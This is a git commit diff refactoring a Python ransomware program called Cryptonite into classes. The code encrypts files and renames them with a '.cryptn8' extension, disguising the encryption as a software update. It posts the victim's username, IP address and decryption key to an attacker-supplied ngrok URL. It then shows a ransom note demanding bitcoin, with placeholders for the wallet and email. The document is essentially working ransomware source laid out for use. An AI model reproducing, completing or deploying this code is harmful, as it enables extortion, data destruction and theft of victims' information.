40c2bd02081cea7312dab435c6da25691ed2b639
Pratheek U <pratheekastro3@gmail.com>
2021-08-04 21:00:05 +0530

    Implemented OOPs (1)

--- Cryptonite.py
+++ Cryptonite.py
@@ -1,3 +1,4 @@
+# imports
 import os
 from cryptography.fernet import Fernet
 import random
@@ -9,20 +10,16 @@ import tqdm
 import pymsgbox._native_win as pymsgbox
 import pymsgbox as pmb
 
+# some GLOBALS
+url = "YOUR_NGROK_URL_HERE"
 key = Fernet.generate_key()
-fernetEncrypt = Fernet(key)
+fe = Fernet(key)
+dkrpt = random.randint(100000, 999999)
+uniqKey = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
 
-decryptPlease = random.randint(100000, 999999)
-uniqueKey = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
-print(decryptPlease)
-
-url = "YOUR_NGROK_URL_HERE"                             # <----  REQUIRED
 BTC_AMOUNT = 0.03                                       # <----  REQUIRED
 BTC_WALLET = "YOUR_BTC_WALLET_HERE"                     # <----  REQUIRED
 EMAIL = "YOUR_EMAIL_HERE"                               # <----  REQUIRED
-
-fileLists = []      # stores the files to be encrypted
-fileList = []       # stores the files to be decrypted
 
 EXCLUDED_DIRS = [   "/Windows",
                     "/Program Files",
@@ -30,97 +27,128 @@ EXCLUDED_DIRS = [   "/Windows",
                     "/AppData"
                 ]
 
+fileLists = []      # stores the files to be encrypted
+fileList = [] 
 
-def sendKeys():
-    id = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
-    user = os.getlogin()
-    key = decryptPlease
-    try:
-        ip = r.get("https://ident.me/").text
-        jsonFormat = {
-            "uniqueId": id,
-            "user": user,
-            "key": key,
-            "ip": ip
-        }
-        r.post(url, data=json.dumps(jsonFormat))
-    except:
-        pmb.confirm("Please make sure that you are connected to the internet and try again.", "Network Error")
-        exit()
 
-def findFiles():
-    print("Please be patient, checking for new updates...\n")
-    time.sleep(5)
-    print("Update found! Downloading the files... \n")
-    for root, dir, file in os.walk('./testfolder'):
-        for i in range(len(EXCLUDED_DIRS)):
-            if EXCLUDED_DIRS[i] in root:
-                break
-            else:
-                if i == len(EXCLUDED_DIRS) - 1:
-                    for files in file:
-                        files = os.path.join(root, files)
-                        fileLists.append(files)
-    print("Download Completed!\n")
-    time.sleep(2)
-    print("Installing the Updates. This might take some time. Please be patient... \n")
-    encrypt()
-    os.system("cls" if os.name == 'nt' else "clear")
+class Cryptonite():
+    def __init__(self,key,fe,dkrpt,uniqKey):
+        self.key = key
+        self.fernetEncrypt = fe
 
-def encrypt():
-    for file in tqdm.tqdm(fileLists):
-        flag = 0
-        newfile = str(file)+".cryptn8"
+        self.decryptPlease = dkrpt
+        self.uniqueKey = uniqKey
+
+              # stores the files to be decrypted
+
+
+    def sendKeys(self):
+        id = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
+        user = os.getlogin()
+        key = self.decryptPlease
         try:
-            with open(file, "rb") as f:
-                data = f.read()
-                encryptedData = fernetEncrypt.encrypt(data)
+            ip = r.get("https://ident.me/").text
+            jsonFormat = {
+                "uniqueId": id,
+                "user": user,
+                "key": key,
+                "ip": ip
+            }
+            r.post(url, data=json.dumps(jsonFormat))
         except:
-            flag = 1
-        if flag == 0:
-            try:
-                with open (file, "wb") as f:
-                    fileList.append(file)
-                    f.write(encryptedData)
-                os.rename(file, newfile)
-            except:
-                a = "error" # just to fill the except block
+            pmb.confirm("Please make sure that you are connected to the internet and try again.", "Network Error")
+            exit()
 
-def warningScreen():
-    warningMessage = f"Your device is infected by CRYPTONITE RANSOMWARE. It uses a military grade encryption to encrypt your files\n\n.If you wish to decrypt your file, send us {BTC_AMOUNT} BTC and email us the unique key provided to you and the proof that you have paid the ransom. Then only we will provide the Decryption key which will decrypt the files\n\nRemember, you will be given only ONE CHANCE to enter the correct key:\n\nBTC wallet address:- {BTC_WALLET}\nEmail address:- {EMAIL}\n\n\nYour unique key: {uniqueKey}\n\n"
-    Alert = pmb.alert("Your device has been Infected by CRYPTONITE RANSOMWARE! Click OK to know further", "ALERT!")
-    OK = pmb.confirm(text=warningMessage, title="Cryptn8", buttons=['I Understood', 'Fuck You!'])
-    if OK == "I Understood":
-        x = pmb.prompt("Decryption key: ", "Enter the Decryption key (ONE CHANCE)")
-        x = int(x)
-        if x == decryptPlease:
-            decrypt()
+
+    def encrypt(self):
+        
+        for file in tqdm.tqdm(fileLists):
+            flag = 0
+            newfile = str(file)+".cryptn8"
+            try:
+                with open(file, "rb") as f:
+                    data = f.read()
+                    encryptedData = self.fernetEncrypt.encrypt(data)
+            except:
+                flag = 1
+            if flag == 0:
+                try:
+                    with open (file, "wb") as f:
+                        fileList.append(file)
+                        f.write(encryptedData)
+                    os.rename(file, newfile)
+                except:
+                    a = "error" # just to fill the except block 
+
+
+    def findFiles(self):
+        
+        print("Please be patient, checking for new updates...\n")
+        time.sleep(5)
+        print("Update found! Downloading the files... \n")
+        for root, dir, file in os.walk('./testfolder'):
+            for i in range(len(EXCLUDED_DIRS)):
+                if EXCLUDED_DIRS[i] in root:
+                    break
+                else:
+                    if i == len(EXCLUDED_DIRS) - 1:
+                        for files in file:
+                            files = os.path.join(root, files)
+                            fileLists.append(files)
+                            
+        print("Download Completed!\n")
+        time.sleep(2)
+        print("Installing the Updates. This might take some time. Please be patient... \n")
+        self.encrypt()
+        os.system("cls" if os.name == 'nt' else "clear") 
+            
+  
+
+    def decrypt(self):
+        for files in fileList:
+            flag = 0
+            try:
+                with open(str(files)+".cryptn8", "rb") as f:
+                    data = f.read()
+            except:
+                flag = 1
+            if flag == 0:
+                try:
+                    with open(str(files)+".cryptn8", "wb") as f:
+                        decryptedData = self.fernetEncrypt.decrypt(data)
+                        f.write(decryptedData)
+                    os.rename(str(files)+".cryptn8", files)
+                except:
+                    a = "error" # just to fill the except block
+
+
+class System(Cryptonite):
+    def __init__(self,key,fe,dkrpt,uniqKey):
+        super().__init__(key,fe,dkrpt,uniqKey)
+
+    def warningScreen(self):
+        warningMessage = f"Your device is infected by CRYPTONITE RANSOMWARE. It uses a military grade encryption to encrypt your files\n\n.If you wish to decrypt your file, send us {BTC_AMOUNT} BTC and email us the unique key provided to you and the proof that you have paid the ransom. Then only we will provide the Decryption key which will decrypt the files\n\nRemember, you will be given only ONE CHANCE to enter the correct key:\n\nBTC wallet address:- {BTC_WALLET}\nEmail address:- {EMAIL}\n\n\nYour unique key: {self.uniqueKey}\n\n"
+        Alert = pmb.alert("Your device has been Infected by CRYPTONITE RANSOMWARE! Click OK to know further", "ALERT!")
+        OK = pmb.confirm(text=warningMessage, title="Cryptn8", buttons=['I Understood', 'Fuck You!'])
+        if OK == "I Understood":
+            x = pmb.prompt("Decryption key: ", "Enter the Decryption key (ONE CHANCE)")
+            x = int(x)
+            if x == self.decryptPlease:
+                self.decrypt()
+            else:
+                pmb.confirm("Have a Great Day!", buttons=['Cancel'])
+                exit()
         else:
             pmb.confirm("Have a Great Day!", buttons=['Cancel'])
             exit()
-    else:
-        pmb.confirm("Have a Great Day!", buttons=['Cancel'])
-        exit()
 
-def decrypt():
-    for files in fileList:
-        flag = 0
-        try:
-            with open(str(files)+".cryptn8", "rb") as f:
-                data = f.read()
-        except:
-            flag = 1
-        if flag == 0:
-            try:
-                with open(str(files)+".cryptn8", "wb") as f:
-                    decryptedData = fernetEncrypt.decrypt(data)
-                    f.write(decryptedData)
-                os.rename(str(files)+".cryptn8", files)
-            except:
-                a = "error" # just to fill the except block
-        
+
+
 if __name__ == "__main__":
     
-    sendKeys()
-    findFiles()
-    warningScreen()
+    cryptn8 = Cryptonite(key,fe,dkrpt,uniqKey)
+    window = System(key,fe,dkrpt,uniqKey)
+
+    # cryptn8.sendKeys()
+    cryptn8.findFiles()
+    window.warningScreen()
